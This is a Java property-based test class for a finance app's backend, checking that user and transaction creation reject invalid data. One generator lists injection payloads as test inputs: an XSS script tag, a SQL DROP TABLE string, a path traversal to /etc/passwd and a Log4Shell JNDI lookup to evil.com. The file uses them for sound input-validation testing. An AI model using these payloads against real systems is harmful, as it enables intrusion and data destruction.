package com.gestaofinanceira.infrastructure.security;

import com.gestaofinanceira.application.dto.command.ComandoCriarTransacao;
import com.gestaofinanceira.application.dto.command.ComandoCriarUsuario;
import com.gestaofinanceira.application.ports.repository.TransacaoRepository;
import com.gestaofinanceira.application.ports.repository.UsuarioRepository;
import com.gestaofinanceira.application.ports.repository.OrcamentoRepository;
import com.gestaofinanceira.application.ports.repository.MetaFinanceiraRepository;
import com.gestaofinanceira.application.ports.service.CriptografiaPort;
import com.gestaofinanceira.application.ports.service.NotificacaoPort;
import com.gestaofinanceira.application.usecases.autenticacao.RegistrarUsuarioUseCase;
import com.gestaofinanceira.application.usecases.transacao.CriarTransacaoUseCase;
import com.gestaofinanceira.application.dto.response.UsuarioResponse;
import com.gestaofinanceira.domain.entities.Transacao;
import com.gestaofinanceira.domain.entities.Usuario;
import com.gestaofinanceira.domain.valueobjects.*;
import net.jqwik.api.*;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.Optional;
import java.util.UUID;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.*;

/**
 * Testes de propriedade para autoridade do backend sobre o estado da aplicação.
 * 
 * Valida que:
 * - Todas as mudanças de estado passam pela validação do backend
 * - Dados inválidos são rejeitados consistentemente
 * - O backend mantém controle total sobre regras de negócio
 * - Não há bypass de validações
 * 
 * Requirements: 10.8
 */
class BackendAuthorityPropertyTest {
    
    // Estrutura para manter os mocks e use cases
    private static class TestContext {
        final UsuarioRepository usuarioRepository;
        final TransacaoRepository transacaoRepository;
        final OrcamentoRepository orcamentoRepository;
        final MetaFinanceiraRepository metaFinanceiraRepository;
        final NotificacaoPort notificacaoPort;
        final CriptografiaPort criptografiaPort;
        final RegistrarUsuarioUseCase registrarUsuarioUseCase;
        final CriarTransacaoUseCase criarTransacaoUseCase;
        
        TestContext() {
            this.usuarioRepository = mock(UsuarioRepository.class);
            this.transacaoRepository = mock(TransacaoRepository.class);
            this.orcamentoRepository = mock(OrcamentoRepository.class);
            this.metaFinanceiraRepository = mock(MetaFinanceiraRepository.class);
            this.notificacaoPort = mock(NotificacaoPort.class);
            this.criptografiaPort = mock(CriptografiaPort.class);
            
            this.registrarUsuarioUseCase = new RegistrarUsuarioUseCase(usuarioRepository, criptografiaPort);
            this.criarTransacaoUseCase = new CriarTransacaoUseCase(
                transacaoRepository, 
                usuarioRepository, 
                orcamentoRepository, 
                metaFinanceiraRepository, 
                notificacaoPort
            );
        }
    }
    
    private TestContext createContext() {
        return new TestContext();
    }
    
    /**
     * Property 18: Backend state authority - User validation
     * For any invalid user data, the backend should reject creation consistently
     * **Validates: Requirements 10.8**
     */
    @Property(tries = 20)
    @Label("Feature: gestao-financeira-domestica, Property 18: Backend state authority - User validation")
    void backendShouldRejectInvalidUserData(@ForAll("invalidUserData") ComandoCriarUsuario comandoInvalido) {
        // Arrange
        TestContext ctx = createContext();
        when(ctx.usuarioRepository.existePorEmail(any())).thenReturn(false);
        when(ctx.criptografiaPort.hashearSenha(any())).thenReturn("hashed-password");
        when(ctx.criptografiaPort.gerarSalt()).thenReturn("salt");
        
        // Act & Assert
        assertThatThrownBy(() -> ctx.registrarUsuarioUseCase.executar(comandoInvalido))
            .isInstanceOf(IllegalArgumentException.class);
        
        // Verificar que nenhum usuário foi salvo
        verify(ctx.usuarioRepository, never()).salvar(any());
    }
    
    /**
     * Property: Backend state authority - Transaction validation
     * For any invalid transaction data, the backend should reject creation consistently
     */
    @Property(tries = 20)
    @Label("Property: Backend state authority - Transaction validation")
    void backendShouldRejectInvalidTransactionData(@ForAll("invalidTransactionData") ComandoCriarTransacao comandoInvalido) {
        // Arrange
        TestContext ctx = createContext();
        UsuarioId usuarioId = new UsuarioId(UUID.randomUUID());
        Usuario usuario = criarUsuarioMock();
        when(ctx.usuarioRepository.buscarPorId(usuarioId)).thenReturn(Optional.of(usuario));
        
        // Act & Assert
        assertThatThrownBy(() -> ctx.criarTransacaoUseCase.executar(comandoInvalido))
            .isInstanceOf(IllegalArgumentException.class);
        
        // Verificar que nenhuma transação foi salva
        verify(ctx.transacaoRepository, never()).salvar(any());
    }
    
    /**
     * Property: Backend validation consistency
     * For any valid data, backend validation should be deterministic
     */
    @Property(tries = 20)
    @Label("Property: Backend validation consistency")
    void backendValidationShouldBeConsistent(@ForAll("validUserData") ComandoCriarUsuario comandoValido) {
        // Arrange
        TestContext ctx = createContext();
        when(ctx.usuarioRepository.existePorEmail(any())).thenReturn(false);
        when(ctx.criptografiaPort.hashearSenha(any())).thenReturn("hashed-password");
        when(ctx.criptografiaPort.gerarSalt()).thenReturn("salt");
        when(ctx.usuarioRepository.salvar(any())).thenAnswer(invocation -> invocation.getArgument(0));
        
        // Act - executar múltiplas vezes
        UsuarioResponse usuario1 = ctx.registrarUsuarioUseCase.executar(comandoValido);
        
        // Create new context for second execution
        TestContext ctx2 = createContext();
        when(ctx2.usuarioRepository.existePorEmail(any())).thenReturn(false);
        when(ctx2.criptografiaPort.hashearSenha(any())).thenReturn("hashed-password");
        when(ctx2.criptografiaPort.gerarSalt()).thenReturn("salt");
        when(ctx2.usuarioRepository.salvar(any())).thenAnswer(invocation -> invocation.getArgument(0));
        
        UsuarioResponse usuario2 = ctx2.registrarUsuarioUseCase.executar(comandoValido);
        
        // Assert - resultados devem ser consistentes
        assertThat(usuario1.email()).isEqualTo(usuario2.email());
        assertThat(usuario1.nome()).isEqualTo(usuario2.nome());
        assertThat(usuario1.ativo()).isEqualTo(usuario2.ativo());
    }
    
    /**
     * Property: Business rule enforcement
     * Backend should enforce business rules regardless of input source
     */
    @Property(tries = 20)
    @Label("Property: Business rule enforcement")
    void backendShouldEnforceBusinessRules(@ForAll("validTransactionData") ComandoCriarTransacao comando) {
        // Arrange
        TestContext ctx = createContext();
        Usuario usuario = criarUsuarioMock();
        when(ctx.usuarioRepository.buscarPorId(comando.usuarioId())).thenReturn(Optional.of(usuario));
        when(ctx.transacaoRepository.salvar(any())).thenAnswer(invocation -> invocation.getArgument(0));
        
        // Act
        Transacao transacao = ctx.criarTransacaoUseCase.executar(comando);
        
        // Assert - verificar que regras de negócio foram aplicadas
        assertThat(transacao.getId()).isNotNull();
        assertThat(transacao.getUsuarioId()).isEqualTo(comando.usuarioId());
        assertThat(transacao.getValor().quantia()).isPositive();
        assertThat(transacao.getData()).isNotNull();
        assertThat(transacao.isAtiva()).isTrue();
        
        // Verificar que o repositório foi chamado
        verify(ctx.transacaoRepository).salvar(any());
    }
    
    /**
     * Property: Input sanitization
     * Backend should handle potentially malicious input safely
     */
    @Property(tries = 20)
    @Label("Property: Input sanitization")
    void backendShouldSanitizeInput(@ForAll("potentiallyMaliciousStrings") String maliciousInput) {
        // Arrange
        TestContext ctx = createContext();
        ComandoCriarUsuario comando = new ComandoCriarUsuario(
            maliciousInput, // email malicioso
            "ValidPassword123!",
            "Valid Name"
        );
        
        when(ctx.usuarioRepository.existePorEmail(any())).thenReturn(false);
        when(ctx.criptografiaPort.hashearSenha(any())).thenReturn("hashed-password");
        when(ctx.criptografiaPort.gerarSalt()).thenReturn("salt");
        
        // Act & Assert
        if (isValidEmail(maliciousInput)) {
            // Se o email é tecnicamente válido, deve processar
            when(ctx.usuarioRepository.salvar(any())).thenAnswer(invocation -> invocation.getArgument(0));
            assertThatNoException().isThrownBy(() -> ctx.registrarUsuarioUseCase.executar(comando));
        } else {
            // Se o email é inválido, deve rejeitar
            assertThatThrownBy(() -> ctx.registrarUsuarioUseCase.executar(comando))
                .isInstanceOf(IllegalArgumentException.class);
        }
    }
    
    // Geradores de dados para os testes
    
    @Provide
    Arbitrary<ComandoCriarUsuario> invalidUserData() {
        return Arbitraries.oneOf(
            // Email inválido
            Arbitraries.just(new ComandoCriarUsuario("", "ValidPassword123!", "Valid Name")),
            Arbitraries.just(new ComandoCriarUsuario("invalid-email", "ValidPassword123!", "Valid Name")),
            Arbitraries.just(new ComandoCriarUsuario(null, "ValidPassword123!", "Valid Name")),
            
            // Senha inválida
            Arbitraries.just(new ComandoCriarUsuario("valid@email.com", "", "Valid Name")),
            Arbitraries.just(new ComandoCriarUsuario("valid@email.com", "123", "Valid Name")),
            Arbitraries.just(new ComandoCriarUsuario("valid@email.com", null, "Valid Name")),
            
            // Nome inválido
            Arbitraries.just(new ComandoCriarUsuario("valid@email.com", "ValidPassword123!", "")),
            Arbitraries.just(new ComandoCriarUsuario("valid@email.com", "ValidPassword123!", null))
        );
    }
    
    @Provide
    Arbitrary<ComandoCriarUsuario> validUserData() {
        return Combinators.combine(
            validEmails(),
            validPasswords(),
            validNames()
        ).as(ComandoCriarUsuario::new);
    }
    
    @Provide
    Arbitrary<ComandoCriarTransacao> invalidTransactionData() {
        UsuarioId usuarioId = UsuarioId.gerar();
        return Arbitraries.oneOf(
            // Valor inválido
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, BigDecimal.ZERO, "Valid Description", "ALIMENTACAO", TipoTransacao.DESPESA, LocalDate.now())),
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, BigDecimal.valueOf(-100), "Valid Description", "ALIMENTACAO", TipoTransacao.DESPESA, LocalDate.now())),
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, null, "Valid Description", "ALIMENTACAO", TipoTransacao.DESPESA, LocalDate.now())),
            
            // Descrição inválida
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, BigDecimal.valueOf(100), "", "ALIMENTACAO", TipoTransacao.DESPESA, LocalDate.now())),
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, BigDecimal.valueOf(100), null, "ALIMENTACAO", TipoTransacao.DESPESA, LocalDate.now())),
            
            // Data inválida
            Arbitraries.just(new ComandoCriarTransacao(
                usuarioId, BigDecimal.valueOf(100), "Valid Description", "ALIMENTACAO", TipoTransacao.DESPESA, null))
        );
    }
    
    @Provide
    Arbitrary<ComandoCriarTransacao> validTransactionData() {
        UsuarioId usuarioId = UsuarioId.gerar();
        return Combinators.combine(
            Arbitraries.bigDecimals().between(BigDecimal.valueOf(0.01), BigDecimal.valueOf(10000.00)),
            Arbitraries.strings().alpha().ofMinLength(5).ofMaxLength(100),
            Arbitraries.of("ALIMENTACAO", "TRANSPORTE", "MORADIA", "LAZER", "SAUDE"),
            Arbitraries.of(TipoTransacao.RECEITA, TipoTransacao.DESPESA),
            Arbitraries.of(LocalDate.now().minusYears(1), LocalDate.now().minusMonths(6), LocalDate.now())
        ).as((valor, descricao, categoria, tipo, data) -> 
            new ComandoCriarTransacao(usuarioId, valor, descricao, categoria, tipo, data));
    }
    
    @Provide
    Arbitrary<String> potentiallyMaliciousStrings() {
        return Arbitraries.oneOf(
            Arbitraries.just("<script>alert('xss')</script>"),
            Arbitraries.just("'; DROP TABLE usuarios; --"),
            Arbitraries.just("../../../etc/passwd"),
            Arbitraries.just("${jndi:ldap://evil.com/a}"),
            Arbitraries.just("user@domain.com<script>"),
            Arbitraries.just("normal@email.com"), // Este deve ser aceito
            Arbitraries.just("test@test.com") // Este deve ser aceito
        );
    }
    
    @Provide
    Arbitrary<String> validEmails() {
        return Combinators.combine(
            Arbitraries.strings().alpha().ofMinLength(3).ofMaxLength(10),
            Arbitraries.strings().alpha().ofMinLength(3).ofMaxLength(10),
            Arbitraries.of("com", "org", "net", "edu")
        ).as((user, domain, tld) -> user + "@" + domain + "." + tld);
    }
    
    @Provide
    Arbitrary<String> validPasswords() {
        return Arbitraries.strings()
            .withCharRange('a', 'z')
            .withCharRange('A', 'Z')
            .withCharRange('0', '9')
            .withChars('!', '@', '#', '$')
            .ofMinLength(8)
            .ofMaxLength(20);
    }
    
    @Provide
    Arbitrary<String> validNames() {
        return Arbitraries.strings()
            .withCharRange('a', 'z')
            .withCharRange('A', 'Z')
            .withChars(' ')
            .ofMinLength(2)
            .ofMaxLength(50);
    }
    
    // Métodos auxiliares
    
    private Usuario criarUsuarioMock() {
        return new Usuario(
            new UsuarioId(UUID.randomUUID()),
            new Email("test@email.com"),
            new SenhaHash("hashed-password", "salt"),
            new Nome("Test User")
        );
    }
    
    private boolean isValidEmail(String email) {
        if (email == null || email.trim().isEmpty()) {
            return false;
        }
        return email.matches("^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$");
    }
}
